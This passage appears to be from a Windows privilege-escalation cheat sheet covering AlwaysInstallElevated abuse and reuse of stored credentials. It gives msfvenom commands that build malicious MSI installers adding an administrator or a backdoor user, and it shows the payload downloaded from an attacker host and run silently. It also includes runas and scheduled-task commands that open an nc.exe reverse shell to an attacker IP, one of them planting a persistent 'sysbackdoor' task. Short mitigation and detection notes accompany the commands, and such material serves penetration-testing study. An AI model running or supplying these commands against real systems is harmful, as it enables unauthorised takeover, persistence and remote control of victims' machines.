✅ Check via Enumeration Tools
Use winPEASany.exe on the target system to automatically enumerate this setting:

powershell

    .\winPEASany.exe all
Look under "Registry - AlwaysInstallElevated" section for any findings.
<img width="1041" height="119" alt="image" src="https://github.com/user-attachments/assets/eb4d5020-8458-41c9-985b-ab6cd9a2f5d1" />

✅ Remote PowerShell Shell Check (Optional)
If you have a reverse shell on the target, verify with:

powershell

    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer
Or automate using PowerShell:

powershell

    Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" | Select-Object AlwaysInstallElevated
    Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" | Select-Object AlwaysInstallElevated
💥 Exploitation
Once confirmed vulnerable, you can exploit the system by creating and executing a malicious .msi payload.

🔧 Step 1: Generate a Malicious MSI File
Option 1: Add User to Administrators Group
bash

    msfvenom -p windows/exec CMD='net localgroup administrators USERNAME /add' -f msi -o adduser.msi
Replace USERNAME with the low-privileged user account you want to escalate.

Option 2: Create a Backdoor User
bash

    msfvenom -p windows/adduser USER=pwned PASS=P@ssw0rd -f msi -o evil.msi
🌐 Step 2: Deliver Payload to Target
Option A: Host on Attacker Machine (Kali)
bash

    python3 -m http.server 8999
Option B: Direct Upload (if you have shell access)
powershell

    upload adduser.msi
Victim-side Download:
powershell

    Invoke-WebRequest -Uri "http://<Attacker-IP>:8999/adduser.msi" -OutFile "adduser.msi"
🚀 Step 3: Execute with SYSTEM Privileges
powershell

    msiexec /quiet /qn /i adduser.msi
/quiet /qn: Ensures the installation is completely silent (no GUI or prompts).

/i: Installs the specified MSI file.

🔎 Post-Exploitation: Verify Success
Confirm that the privilege escalation worked by checking group membership:

powershell
net localgroup administrators
You should now see the new or escalated user added to the Administrators group.
<img width="1062" height="586" alt="image" src="https://github.com/user-attachments/assets/b1865faf-8580-4771-bd50-5ef0742083f8" />

📘 Summary
Step	Description
1. Detect	Query registry or use winPEASany.exe to confirm both HKCU and HKLM values set to 1.
2. Create Payload	Use msfvenom to generate a .msi that adds a user or runs arbitrary commands.
3. Deliver Payload	Host on HTTP server or upload directly.
4. Execute with msiexec	msiexec /quiet /qn /i payload.msi runs it as SYSTEM.
5. Verify	Use net localgroup administrators to confirm elevated privileges.

🔐 Mitigation
Admins should ensure AlwaysInstallElevated is not enabled on both user and machine levels unless explicitly required (which is rare in modern environments).

To disable:

bash
     
     reg delete HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
     reg delete HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f

</details>
<details>
<summary>Stored Credentials</summary>
 <br> 

==================

Windows allows users to store credentials in the system using Credential Manager or via commands like runas /savecred. These credentials are saved in a user-specific vault and may be reused by any user with access to the same session. If the /savecred option was used earlier or credentials were saved via GUI, they can be leveraged to execute commands under higher-privileged contexts without re-entering passwords.

🔍 Step 1: Enumerate Stored Credentials
Use the built-in cmdkey.exe utility to view stored credentials:

cmd

    cmdkey /list
🔎 Sample Output:

    yaml
    Currently stored credentials:

    Target: Domain:interactive=PWNED\Administrator
    Type: Domain Password
    User: PWNED\Administrator
✅ This shows that the user PWNED\Administrator has saved credentials available for use.

🚀 Step 2: Execute Commands Using Saved Credentials
Use runas with the /savecred flag to reuse stored credentials without retyping the password:

cmd

    runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <port> -e cmd.exe"
💡 runas spawns the command as the specified user. If /savecred is used and credentials were saved earlier, the prompt is skipped.

🧠 Note:

/savecred does not store credentials — it reuses previously saved ones.

You must provide full absolute paths for commands.

💥 Real-World Exploitation Example
User Administrator has previously saved credentials.

You run:

cmd

    runas /user:Administrator /savecred "C:\Windows\System32\cmd.exe"
You now have a shell running as Administrator, no password required.

🔁 Alternatives & Enhancements
✅ Use PsExec (if credentials were saved elsewhere or token is available):
cmd

    psexec.exe -u PWNED\Administrator -p <known-password> cmd.exe
Or combine with hashes if using Pass-the-Hash scenarios.

✅ Use PowerShell to Elevate:
powershell

    Start-Process "cmd.exe" -Credential (New-Object System.Management.Automation.PSCredential("PWNED\Administrator",(ConvertTo-SecureString "Dummy" -AsPlainText -Force)))
⚠️ Only works if plaintext password is known. Doesn’t support /savecred.

✅ Use Task Scheduler for Persistent Elevation:
cmd

    schtasks /create /tn "sysbackdoor" /tr "cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> 4444 -e cmd.exe" /sc once /st 00:00 /ru "PWNED\Administrator" /RL HIGHEST /F
Leverages stored creds if previously authenticated with this account.

🛡️ Detection & Defense
Defense	Description
🔍 Monitor cmdkey.exe usage	Unusual calls can indicate enumeration
📊 Detect runas /savecred usage	Enable command-line logging (e.g., Sysmon Event ID 1)
🔒 Limit use of /savecred	Enforce GPO to block its usage
🔐 Clear saved credentials	Use cmdkey /delete:<target> to remove saved entries
👁️ Monitor for runas.exe and scheduled task abuse	High-privilege task execution by low-privileged users is a red flag

🧹 Optional Cleanup
Clear stored credentials after use:

cmd

    cmdkey /delete:Domain:interactive=PWNED\Administrator
This deletes the saved credential and prevents re-use by attackers.

✅ Summary Cheat Sheet
Task	Command
View stored creds	cmdkey /list
Run with saved creds	runas /user:<user> /savecred "<command>"
Clear saved creds	cmdkey /delete:<target>
Elevate via PsExec	psexec -u <user> -p <password> cmd.exe
Schedule task w/ creds	schtasks /create ... /ru <user>

   </details>
